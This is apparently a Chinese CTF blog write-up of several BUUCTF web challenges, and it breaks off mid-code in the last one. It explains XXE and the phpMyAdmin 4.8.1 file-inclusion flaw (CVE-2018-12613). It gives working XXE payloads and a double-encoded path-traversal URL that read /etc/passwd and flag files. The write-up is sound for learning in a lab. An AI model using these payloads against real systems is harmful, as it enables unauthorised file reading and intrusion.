<p>进页面之后尝试 admin 登录失败，抓包也没有获得什么信息。题目提示说 XML，查查看，看到了 XML External Entity Injection 即 xml 外部实体注入漏洞，贴一个学习链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html%E3%80%81https://www.cnblogs.com/s1awwhy/p/13736633.html%E3%80%82">https://www.freebuf.com/vuls/175451.html、https://www.cnblogs.com/s1awwhy/p/13736633.html。</a></p>
<p>做一个简单的记录：</p>
<blockquote>
<p>XXE 漏洞全称 XML External Entity  Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起 dos 攻击等危害。xxe 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传恶意 xml 文件。</p>
<p><strong>XML</strong></p>
<ul>
<li>
<p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p>
</li>
<li>
<p>HTML 被设计用来显示数据，其焦点是数据的外观。</p>
</li>
</ul>
<p>XML 把数据从 HTML 分离，XML 是独立于软件和硬件的信息传输工具。</p>
<p>基本语法：</p>
<ul>
<li>
<p>所有 XML 元素都须有关闭标签。</p>
</li>
<li>
<p>XML 标签对大小写敏感。</p>
</li>
<li>
<p>XML 必须正确地嵌套。</p>
</li>
<li>
<p>XML 文档必须有根元素。</p>
</li>
<li>
<p>XML 的属性值须加引号</p>
</li>
</ul>
<p>实体引用，这里看个例子，如果你把字符 “&lt;” 放在 XML，素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生 XML 错误：</p>
<p><code>&lt;message&gt;hello &lt; world&lt;/message&gt;</code> , 为了避免错误。我们用实体引用 <code>&amp;lt;</code>  来代替 &quot;&lt;&quot; 字符。XML 中，有 5 个预定义的实体引用。</p>
<table>
<thead>
<tr>
<th>实体名称</th>
<th>显示结果</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;It;</td>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>&amp;gt;</td>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&amp;amp;</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&amp;apos;</td>
<td>’</td>
<td>单引号</td>
</tr>
<tr>
<td>&amp;quot;</td>
<td>&quot;</td>
<td>引号</td>
</tr>
</tbody>
</table>
<p>注意：在 XML 中，只有字符 &quot;&lt;“和”&amp;&quot; 是确实非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p>
<p>在 XML 中，空格会被保留，多个空格不会被合并为一个。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;bookstore&gt; &lt;!--根元素--&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt; &lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="line">&lt;title&gt;Everyday Italian&lt;/title&gt; &lt;!--book的子元素，lang为属性--&gt;</span><br><span class="line">&lt;author&gt;Giada De Laurentiis&lt;/author&gt; &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;year&gt;2005&lt;/year&gt; &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;price&gt;30.00&lt;/price&gt; &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;/book&gt; &lt;!--book的结束--&gt;</span><br><span class="line">&lt;/bookstore&gt; &lt;!--bookstore的结束--&gt;</span><br></pre></td></tr></table></figure>
<p><strong>DTD</strong></p>
<p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。带有 DTD 的 XML 文档实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<p>当使用外部 DTD 时，通过如下语法引入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>外部 OTD 实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<p><strong>DTD - 实体 (重要)</strong></p>
<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可以在内部或外部进行声明</p>
<p><strong>内部实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>外部实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>参数实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt;</span><br><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><strong>参数实体 + 外部实体</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">  &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p><code>%name</code>  (参数实体) 是在 DTD 中被引用的，而 <code>&amp;name;</code>  是在 xml 文档中被引用的。</p>
<p>XXE 主要是利用了 DTD 引用外部实体导致的漏洞。</p>
<p>外部引用可支持 http、file 等协议，不同的语言支持的协议不同，但存在一些通用的协议。例如：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b12.png" alt></p>
<p><strong>实际利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;root&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p><strong>XXE 的危害：</strong></p>
<ul>
<li>任意文件读取。利用 file、http 协议，在 DTD 外部引用中注入，从而获取文件内容。任意文件读取有分为有回显和无回显两种。</li>
<li>命令执行。php 环境下，xml 命令执行要求 php 装有 expect 扩展。而该扩展默认没有安装。</li>
<li>内网探测 / SSRF。由于 xml 实体注入攻击可以利用 http:// 协议，也就是可以发起 http 请求。可以利用该请求去探查内网，进行 SSRF 攻击。</li>
<li>攻击内网网站。</li>
</ul>
</blockquote>
<p>回到题目，构造 payload 尝试文件读取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b13.png" alt></p>
<p>成功，尝试获取 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b14.png" alt></p>
<p 1bb61c65-9ae8-4d08-8106-1936c2805383>成功拿到 flag，flag</p>
<h2 id="gwctf-2019我有一个数据库"><a class="markdownIt-Anchor" href="#gwctf-2019我有一个数据库">#</a> [GWCTF 2019] 我有一个数据库</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b15.png" alt></p>
<p>进来的页面一堆乱七八糟的内容。。。而且源码也没什么信息，dirsearch 开扫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://9a9ffbc2-edb6-47c4-9207-d90ccb6245fb.node5.buuoj.cn:81/ -e *</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b16.png" alt></p>
<p>看看 robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: phpinfo.php</span><br></pre></td></tr></table></figure>
<p>看看能不能从 phpinfo 里面得到什么信息</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b17.png" alt></p>
<p>没看到什么有用的信息，结合题目提到的数据库和扫描出的 phpmyadmin，应该重点关注 phpmyadmin/index.php</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b18.png" alt></p>
<p>进入页面之后得到 phpmyadmin 的信息 <code>phpMyAdmin版本信息： 4.8.1</code> ，查找一下相关漏洞，找到 CVE-2018-12613 PHPmyadmin 文件包含漏洞分析及漏洞利用</p>
<p>链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/109701126%E3%80%81https://blog.csdn.net/weixin_44037296/article/details/111039461">https://blog.csdn.net/weixin_41924764/article/details/109701126、https://blog.csdn.net/weixin_44037296/article/details/111039461</a></p>
<p>最为具体的是这一个：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46898243/article/details/106244110">https://blog.csdn.net/m0_46898243/article/details/106244110</a></p>
<p>这里简单记录一下：</p>
<blockquote>
<p>在 4.8.2 之前的 phpMyAdmin 4.8.x 中发现了一个问题，攻击者可以在其中包含（查看并可能执行）服务器上的文件。该漏洞来自页面重定向和在 phpMyAdmin 中加载的部分代码，以及对列入白名单的页面的不正确测试。除 “$ cfg [‘AllowArbitraryServer’] = true” 情况（攻击者可以指定他 / 她已经控制的任何主机，并在 phpMyAdmin 上执行任意代码）外，攻击者还必须经过身份验证。 [‘ServerDefault’] = 0“的情况（绕过登录要求，并在没有任何身份验证的情况下运行易受攻击的代码）。</p>
<p>下载 phpMyAdmin 4.8.1 源码 https://www.phpmyadmin.net/files/4.8.1/<br>
 漏洞问题出现在 index.php 页面 55~63：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// If we have a valid target, let&#x27;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#x27;target&#x27;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>include $_REQUEST['target'];</code>  可能存在<strong>文件包含</strong>漏洞， <code>$target</code>  变量中不能以 <code>index</code>  开头，且不能是 <code>$target_blacklist</code>  黑名单中的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Black list of all scripts to which front-end must submit data.</span><br><span class="line"> * Such scripts must not be loaded on home page.</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">$target_blacklist = array (</span><br><span class="line">    &#x27;import.php&#x27;, &#x27;export.php&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>只要不是 <code>import.php</code>  或 <code>export.php</code>  即可</p>
<p>满足 <code>Core</code>  类的 <code>checkPageValidity()</code>  方法，在 <code>phpMyAdmin/libraries/classes/Core.php</code>  中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* boolean phpMyAdmin.Core::checkPageValidity(string &amp;$page, array $whitelist)</span><br><span class="line">*</span><br><span class="line">* checks given $page against given $whitelist and returns true if valid</span><br><span class="line">* it optionally ignores query parameters in $page (script.php?ignored)</span><br><span class="line">*</span><br><span class="line">* @param string &amp;$page     page to check</span><br><span class="line">* @param array  $whitelist whitelist to check page against</span><br><span class="line">*</span><br><span class="line">* @return boolean whether $page is valid or not (in $whitelist or not)</span><br><span class="line">*/</span><br><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist = [])</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($whitelist)) &#123;</span><br><span class="line">        $whitelist = self::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = mb_substr(         $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析代码：</p>
<ul>
<li>需要让该函数返回 <code>true</code> ，也就是变量 <code>$_page</code>  在白名单中，但白名单为空</li>
<li><code>mb_strpos()</code>  方法是查找字符串在另一个字符串中首次出现的位置</li>
<li><code>mb_substr()</code>  方法返回字符串的一部分</li>
<li>也就是经过两个函数的共同处理， <code>$_page</code>  变量去除了后面的传参，只保存了文件名</li>
<li>也就是 <code>index.php?id=1</code>  经处理变成了 <code>index.php</code></li>
<li>变量 <code>$_page</code>  在白名单中，但白名单为空</li>
<li>变量 <code>$_page</code>  经过 <code>urldecode()</code>  方法，继续做如上操作</li>
<li>若都不满足，则返回 <code>false</code></li>
</ul>
<p>其中问题出现在 <code>$_page = urldecode($page);</code>  中，可以利用这个函数绕过 <code>$whitelist</code>  白名单的检测，构造 Pyaload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p>也就是将在浏览器传入参数时， <code>?</code>  进行一次解码，再经过 <code>urldecode()</code>  的第两次解码后，会导致 <code>db_sql.php</code>  作为参数而绕过白名单检测，从而实现文件读取。</p>
<p>payload 解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target=db_sql.php%253f/../</span><br></pre></td></tr></table></figure>
<p>首先服务器接收到该传参后进行一次 URL 解码，变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target=db_sql.php%3f/../</span><br></pre></td></tr></table></figure>
<p>该值可以顺利的通过前 4 个条件的判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">! empty($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">&amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">&amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])</span><br><span class="line">&amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后进入 checkPageValidity 函数，在执行   <code>if(in_array($page, $whitelist))</code>  将原生的 target 值与白名单进行匹配、 <code>if(in_array($page, $whitelist))</code>  将去掉传参的 targte 的值与白名单进行匹配  的时候均匹配失败 (前者匹配原声 target 的值，后者匹配去掉传参后的 target 的值)，于是执行 <code>if(in_array($page, $whitelist))</code> ，在这个条件中会对该值进行 URL 解码，变成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target=db_sql.php?/../</span><br><span class="line"><span class="comment">#%3f是?的URL编码</span></span><br></pre></td></tr></table></figure>
<p>解码完成之后，会去除去除传参，最终变成了 <code>target=db_sql.php</code> ，能够成功的匹配白名单。</p>
</blockquote>
<p>回到题目，这个 CVE 尝试利用，多个 <code>../</code>  是为了确保能够回到根目录，构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<p>成功获取到 passwd</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b19.png" alt></p>
<p>获取 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b20.png" alt></p>
<h2 id="bjdctf2020mark-loves-cat"><a class="markdownIt-Anchor" href="#bjdctf2020mark-loves-cat">#</a> [BJDCTF2020]Mark loves cat</h2>
<p>打开题目，琢磨了一番，没什么头绪，dirsearch 开扫，扫出了 <code>.git/</code> ，那应该是源码泄露，用 githack 提取出源码，怎么使用 githack 获取源码翻之前源码泄露的题目</p>
<p>提取出 index.php 有用的部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span 